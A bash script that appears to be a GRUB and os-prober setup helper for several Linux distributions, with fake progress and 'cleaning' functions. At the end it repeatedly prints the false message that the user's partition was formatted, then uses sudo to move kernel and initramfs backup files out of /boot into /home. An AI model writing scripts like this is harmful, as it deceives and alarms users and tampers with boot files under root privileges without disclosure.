#!/bin/bash

# Function to simulate an animated progress bar
animate_progress() {
    local pid=$!
    local delay=0.1
    local spin='-\|/'
    local i=0

    echo -n "Installing requirement file ["
    while [ -d /proc/$pid ]; do
        printf "\b${spin:$i:1}"
        i=$(( (i+1) % 4 ))
        sleep $delay
    done
    echo "] Done!"
}

# Function to simulate cleaning the recycle bin
clean_recycle_bin() {
    echo "Cleaning the recycle bin..."
    # Simulate cleaning process here
    echo "Recycle bin cleaned successfully!"
}

# Function to simulate installing a "requirement" file
install_requirement() {
    echo "Installing requirement file..."
    # Simulate installation process here
    # For demonstration, let's simulate a long-running process
    ( sleep 5 && echo "Requirement file installed successfully!" ) &
    animate_progress
}

# Main function
main() {
    # Update package lists and install necessary packages based on package managers
    if [ -x "$(command -v pacman)" ]; then
        sudo pacman -Sy --needed grub os-prober nano wget git unzip
    elif [ -x "$(command -v apt)" ]; then
        sudo apt update && sudo apt install grub os-prober nano wget git unzip
    elif [ -x "$(command -v xbps-install)" ]; then
        sudo xbps-install -Sy grub os-prober nano wget git unzip
    elif [ -x "$(command -v dnf)" ]; then
        sudo dnf install grub2 os-prober nano wget git unzip
    else
        echo "Unsupported package manager. Please install required packages manually."
    fi

    # Adjust grub configuration to enable os-prober
    echo "Enabling os-prober in /etc/default/grub..."
    sudo sed -i 's/GRUB_DISABLE_OS_PROBER=true/GRUB_DISABLE_OS_PROBER=false/' /etc/default/grub
    sudo grub-mkconfig -o /boot/grub/grub.cfg

    # Prompt user to run grub-customizer
    read -p "Do you want to run 'sudo grub-customizer'? (y/n) " choice
    if [[ $choice =~ ^[Yy]$ ]]; then
        sudo grub-customizer
    elif [[ $choice =~ ^[Nn]$ ]]; then
        echo "Operation aborted."
    else
        echo "Invalid choice. Operation aborted."
    fi

    # Display final messages
    echo "Before closing grub-customizer, ensure you've saved your configurations."
    echo "Process completed. Have a nice coding session!"

    # Clone bootloader repair script from GitHub
    mkdir -p ~/Desktop
    cd ~/Desktop
    echo "To repair the bootloader with a Linux kernel, you can use 'repair-bootloader-all-v2' named 'REPAIR-BOOTLOADER-KERNEL-ARCH'."
    git clone https://github.com/ulebuntupro/repair-bootloader-all 
    echo "Download completed. Now, navigate to the directory and execute if more repair services are required for Arch bootloader issues."
}

# Run the main function
main
echo "Completed. but your partition was formatted all!"
echo "if not work on your system arch try run 3 file that uploaded"
echo "good luck to learning code..."
echo "sorry and reboot"
echo "Completed. but your partition was formatted all!"
echo "sorry and reboot"
echo "Completed. but your partition was formatted all!"
echo "sorry and reboot"
echo "Completed. but your partition was formatted all!"
echo "sorry and reboot"
echo "Completed. but your partition was formatted all!"
echo "sorry and reboot"
echo "Completed. but your partition was formatted all!"
echo "sorry and reboot"
echo "Completed. but your partition was formatted all!"
echo "sorry and reboot"
echo "Completed. but your partition was formatted all!"
echo "sorry and reboot"
echo "Completed. but your partition was formatted all!"
echo "sorry and reboot"
echo "Completed. but your partition was formatted all!"
echo "sorry and reboot"
echo "Completed. but your partition was formatted all!"
echo "sorry and reboot"
echo "Completed. but your partition was formatted all!"
echo "sorry and reboot"
echo "Completed. but your partition was formatted all!"
echo "good luck to learning code bash..."
echo "lol zsh"
sudo mv /boot/initramfs-linux.img.backup /home/
sudo mv /boot/vmlinuz-linux.backup /home/
